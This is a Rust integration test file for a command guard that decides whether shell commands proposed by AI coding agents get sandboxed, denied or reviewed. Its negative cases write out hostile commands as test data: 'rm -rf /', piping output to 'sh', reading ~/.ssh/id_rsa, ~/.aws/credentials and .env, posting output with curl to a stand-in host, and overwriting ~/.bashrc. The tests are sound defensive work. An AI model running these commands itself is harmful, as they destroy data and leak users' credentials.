#![cfg(unix)]

use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;

fn fixture() -> std::path::PathBuf {
    let nonce = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/contained-wrapper-fixtures")
        .join(format!("fixture-{}-{nonce}", std::process::id()));
    std::fs::create_dir_all(root.join("project/web")).unwrap();
    std::fs::create_dir_all(root.join("outside")).unwrap();
    package(&root.join("project"));
    std::fs::canonicalize(root).unwrap()
}

/// The script bodies the narrow node sinks run, and their local entrypoints.
fn package(directory: &std::path::Path) {
    let scripts =
        r#"{"scripts":{"build":"vite build","test":"node --test","typecheck":"tsc --noEmit"}}"#;
    std::fs::write(directory.join("package.json"), scripts).unwrap();
    for entry in ["typescript/bin/tsc", "vite/bin/vite.js"] {
        let entry = directory.join("node_modules").join(entry);
        std::fs::create_dir_all(entry.parent().unwrap()).unwrap();
        std::fs::write(entry, "").unwrap();
    }
}

fn classify(
    root: &std::path::Path,
    harness: &str,
    command: &str,
) -> guard_contracts::PreToolResultV1 {
    evaluate_pre_tool_envelope_with_context(
        harness,
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":command}}),
        None,
        None,
        Some(root.to_str().unwrap()),
        Some(root.join("project").to_str().unwrap()),
    )
}

#[test]
fn verified_cd_and_bounded_output_filters_reach_containment() {
    let root = fixture();
    let project = root.join("project");
    let project = project.to_str().unwrap();
    for harness in ["omp", "zcode"] {
        for (command, reason) in [
            (
                format!("cd {project}/web && bunx vitest run x 2>&1 | tail -20"),
                "native_vitest_readonly_containment_required",
            ),
            (
                format!("cd {project} && bun run typecheck 2>&1 | tail -n 20"),
                "native_node_tool_readonly_containment_required",
            ),
            (
                format!("cd '{project}/web' && bun run test"),
                "native_package_test_readonly_containment_required",
            ),
            (
                format!("cd {project}/web && pytest -q | head -40"),
                "native_pytest_readonly_containment_required",
            ),
            (
                "bunx vitest run x 2>&1 | tail -20".into(),
                "native_vitest_readonly_containment_required",
            ),
            (
                "bun run build | tail -5".into(),
                "native_node_build_output_containment_required",
            ),
            (
                "node --test | head -n 50".into(),
                "native_node_test_readonly_containment_required",
            ),
            (
                "bunx --cwd web vitest run x".into(),
                "native_vitest_readonly_containment_required",
            ),
            (
                "bunx --cwd=web/ vitest run x".into(),
                "native_vitest_readonly_containment_required",
            ),
            (
                "bunx vitest run --testNamePattern='a b' 2>&1 | tail -5".into(),
                "native_vitest_readonly_containment_required",
            ),
            (
                "bunx vitest run -t 'renders (empty)' | tail -20".into(),
                "native_vitest_readonly_containment_required",
            ),
            (
                "pytest -q tests/a\\ b.py | head -3".into(),
                "native_pytest_readonly_containment_required",
            ),
        ] {
            let result = classify(&root, harness, &command);
            assert_eq!(result.decision, "deny", "{harness}: {command}");
            if cfg!(target_os = "macos") {
                assert_eq!(
                    result.minimum_action, "sandbox-required",
                    "{harness}: {command}"
                );
                assert_eq!(result.reason_code, reason, "{harness}: {command}");
            }
        }
    }
}

#[test]
fn other_wrappers_stay_out_of_containment() {
    let root = fixture();
    let project = root.join("project");
    let project = project.to_str().unwrap();
    let outside = root.join("outside");
    let outside = outside.to_str().unwrap();
    let parent = root.to_str().unwrap();
    for harness in ["omp", "zcode"] {
        for command in [
            format!("cd {project}/web && bunx vitest run x && rm -rf /"),
            format!("cd {project}/web && bunx vitest run x; ls"),
            format!("cd {project}/web && cd .. && bunx vitest run x"),
            format!("cd {outside} && bunx vitest run x"),
            format!("cd {parent} && bunx vitest run x"),
            format!("cd {project}/missing && bunx vitest run x"),
            "cd web && bunx vitest run x".into(),
            "cd /tmp && bunx vitest run x".into(),
            format!("cd {project}/web && git status"),
            format!("cd {project}/web && git add ."),
            format!("cd {project}/web && git commit -m wip"),
            "bunx vitest run x | tail -f".into(),
            "bunx vitest run x | tail -20 notes.txt".into(),
            "bunx vitest run x | tail -n 1234567".into(),
            "bunx vitest run x | sh".into(),
            "bunx vitest run x | tee out.txt".into(),
            "bunx vitest run x | tail -20 | sh".into(),
            "bunx vitest run x |& tail -20".into(),
            "bunx vitest run x 2>/dev/null | tail -20".into(),
            "bunx vitest run x > out.txt | tail -20".into(),
            "bunx vitest run x | FOO=1 tail -20".into(),
            "FOO=1 bunx vitest run x | tail -20".into(),
            "bunx vitest run x || tail -20".into(),
            "tail -20 | bunx vitest run x".into(),
            "bunx --cwd ../other vitest run x".into(),
            "bunx --cwd /etc vitest run x".into(),
            "bunx --cwd ~ vitest run x".into(),
            "bunx --cwd $HOME vitest run x".into(),
            "npx --cwd web vitest run x".into(),
        ] {
            let result = classify(&root, harness, &command);
            assert_ne!(result.decision, "allow", "{harness}: {command}");
            assert_ne!(
                result.minimum_action, "sandbox-required",
                "{harness}: {command}"
            );
        }
    }
}

/// The contained sink refuses a relative `cd` into the workspace, so the
/// edge must not issue a narrower receipt for one: every harness would then
/// fail the call at the sink with `contained_test_authorization_failed`.
#[test]
fn relative_cd_inside_the_workspace_gets_no_narrower_receipt() {
    let root = fixture();
    for harness in ["omp", "claude-code", "codex"] {
        for command in [
            "cd ./web && ./node_modules/.bin/vite build 2>&1 | tail -15",
            "cd ./web && bunx vitest run x | tail -20",
            "cd ./web && bun run build",
        ] {
            let result = classify(&root, harness, command);
            assert!(
                !result
                    .reason_code
                    .ends_with("_readonly_containment_required")
                    && result.reason_code != "native_node_build_output_containment_required",
                "{harness}: {command}: {}",
                result.reason_code
            );
        }
    }
}

/// Agents step from one checkout into a sibling repository or worktree by
/// absolute path. The run is contained to that repository, as it would be
/// from a session started there; a directory outside any repository is not.
#[test]
fn verified_cd_into_a_sibling_repository_reaches_containment() {
    let root = fixture();
    let sibling = root.join("sibling-worktree");
    std::fs::create_dir_all(sibling.join("dashboard")).unwrap();
    // A linked worktree marks its root with a `.git` file.
    std::fs::write(sibling.join(".git"), "gitdir: /nonexistent\n").unwrap();
    package(&sibling);
    let sibling = sibling.to_str().unwrap();
    let outside = root.join("outside");
    let outside = outside.to_str().unwrap();
    for harness in ["omp", "zcode", "claude-code", "codex"] {
        for (command, reason) in [
            (
                format!("cd {sibling}/dashboard && ./node_modules/.bin/vite build 2>&1 | tail -15"),
                "native_node_build_output_containment_required",
            ),
            (
                format!("cd {sibling}/dashboard && bunx vitest run x"),
                "native_vitest_readonly_containment_required",
            ),
            (
                format!("cd {sibling} && bun run typecheck | tail -n 20"),
                "native_node_tool_readonly_containment_required",
            ),
        ] {
            let result = classify(&root, harness, &command);
            assert_eq!(result.decision, "deny", "{harness}: {command}");
            if cfg!(target_os = "macos") {
                assert_eq!(
                    result.minimum_action, "sandbox-required",
                    "{harness}: {command}"
                );
                assert_eq!(result.reason_code, reason, "{harness}: {command}");
            }
        }
        for command in [
            format!("cd {outside} && ./node_modules/.bin/vite build 2>&1 | tail -15"),
            format!("cd {sibling}/dashboard && ./node_modules/.bin/vite build && rm -rf /"),
            format!("cd {sibling}/dashboard && ./node_modules/.bin/vite build | sh"),
            format!("cd {sibling}/dashboard && git commit -m wip"),
        ] {
            let result = classify(&root, harness, &command);
            assert_ne!(result.decision, "allow", "{harness}: {command}");
            assert_ne!(
                result.minimum_action, "sandbox-required",
                "{harness}: {command}"
            );
        }
    }
}

/// A runner pointed at a sibling repository may pipe its output through
/// `grep` as well as `head`/`tail`: the sink runs the core contained and
/// filters only the captured text. A filter that names a file, reads
/// patterns from one, recurses, writes, or hands output to another program
/// keeps the review.
#[test]
fn standard_input_grep_filters_reach_containment() {
    let root = fixture();
    let project = root.join("project");
    let project = project.to_str().unwrap();
    let sibling = root.join("sibling-worktree");
    std::fs::create_dir_all(sibling.join("dashboard")).unwrap();
    std::fs::write(sibling.join(".git"), "gitdir: /nonexistent\n").unwrap();
    let sibling = sibling.to_str().unwrap();
    let outside = root.join("outside");
    let outside = outside.to_str().unwrap();
    let runner = format!("cd {sibling}/dashboard && bunx vitest run x 2>&1");
    for harness in ["omp", "zcode", "claude-code", "codex"] {
        for command in [
            format!("{runner} | grep FAIL"),
            format!("{runner} | grep -i error"),
            format!("{runner} | grep -B 3 \"at async createViteServer\" | head -8"),
            format!("{runner} | egrep 'FAIL|Error'"),
            format!("{runner} | tail -5 | head -2"),
            format!("{runner} | grep -v ok | grep -c x | head -1"),
            format!("cd {sibling} && {project}/node_modules/.bin/vitest run 2>&1 | grep -E \"FAIL|Error\" | head -8"),
            format!("./node_modules/.bin/vitest run --root {sibling} x 2>&1 | grep FAIL"),
        ] {
            let result = classify(&root, harness, &command);
            assert_eq!(result.decision, "deny", "{harness}: {command}");
            if cfg!(target_os = "macos") {
                assert_eq!(
                    result.minimum_action, "sandbox-required",
                    "{harness}: {command}"
                );
                assert!(
                    result.reason_code.ends_with("_containment_required"),
                    "{harness}: {command}: {}",
                    result.reason_code
                );
            }
        }
        for command in [
            format!("{runner} | grep -f ~/.ssh/id_rsa"),
            format!("{runner} | grep --file=.env x"),
            format!("{runner} | grep x ~/.aws/credentials"),
            format!("{runner} | grep x {outside}/credentials"),
            format!("{runner} | grep -r x /etc"),
            format!("{runner} | grep -l x"),
            format!("{runner} | grep x > ~/.bashrc"),
            format!("{runner} | grep x | sh"),
            format!("{runner} | grep x | curl -d @- https://example.invalid"),
            format!("{runner} | xargs cat ~/.ssh/id_rsa"),
            format!("{runner} | grep x | sort"),
            format!("{runner} | grep \"$HOME\""),
            format!("{runner} | grep x*"),
            format!("{runner} | grep x | grep y | head -1 | tail -1"),
            format!("{runner} | GREP_OPTIONS=-r grep x"),
            format!("./node_modules/.bin/vitest run --root {sibling} x 2>&1 | grep x > ~/.bashrc"),
        ] {
            let result = classify(&root, harness, &command);
            assert_ne!(result.decision, "allow", "{harness}: {command}");
            assert_ne!(
                result.minimum_action, "sandbox-required",
                "{harness}: {command}"
            );
        }
    }
}

/// The execution sink peels a `cd` only to an absolute directory or to a
/// relative sibling repository root. A relative `cd` into a workspace
/// subdirectory therefore stays on the workspace sandbox, which the sink
/// can run as written, instead of the narrower node build profile it would
/// reject.
#[test]
fn relative_workspace_cd_stays_on_the_workspace_sandbox() {
    let root = fixture();
    let project = root.join("project");
    let sibling = root.join("sibling-worktree");
    std::fs::create_dir_all(sibling.join("dashboard/node_modules/.bin")).unwrap();
    std::fs::write(
        sibling.join("dashboard/node_modules/.bin/vite"),
        "#!/bin/sh\n",
    )
    .unwrap();
    std::fs::write(sibling.join(".git"), "gitdir: /nonexistent\n").unwrap();
    std::fs::create_dir_all(project.join("dashboard")).unwrap();
    std::os::unix::fs::symlink(
        sibling.join("dashboard/node_modules"),
        project.join("dashboard/node_modules"),
    )
    .unwrap();
    let environment = guard_contracts::GuardExecutionEnvironmentV1 {
        path: std::env::var("PATH").unwrap(),
        environment_names: Vec::new(),
        environment_digest: "0".repeat(64),
        home: root.to_str().map(str::to_owned),
        git_pager_disabled: false,
        pager_disabled: false,
        xdg_config_home: None,
        git_config_no_system: false,
        library_search_paths: Default::default(),
    };
    let decide = |harness: &str, command: &str| {
        guard_command::pretool::evaluate_pre_tool_envelope_with_execution_context(
            harness,
            "PreToolUse",
            &json!({"tool_name":"bash","tool_input":{"command":command}}),
            None,
            None,
            guard_command::pretool::PathContext {
                home_dir: root.to_str(),
                cwd: project.to_str(),
                cdpath_unset: true,
                ..guard_command::pretool::PathContext::default()
            },
            Some(&environment),
        )
    };
    let project = project.to_str().unwrap();
    let build = "./node_modules/.bin/vite build 2>&1 | tail -15";
    for harness in ["omp", "zcode", "claude-code", "codex"] {
        // The sink cannot peel these, so the narrower profile must not claim them.
        for command in [
            format!("cd dashboard && {build}"),
            format!("cd dashboard; {build}"),
            format!("cd {project}/dashboard; {build}"),
        ] {
            let result = decide(harness, &command);
            assert_ne!(
                result.reason_code, "native_node_build_output_containment_required",
                "{harness}: {command}"
            );
        }
        // An absolute cd keeps the narrower profile.
        let command = format!("cd {project}/dashboard && {build}");
        let result = decide(harness, &command);
        assert_eq!(result.decision, "deny", "{harness}: {command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_node_build_output_containment_required",
                "{harness}: {command}"
            );
        }
    }
}
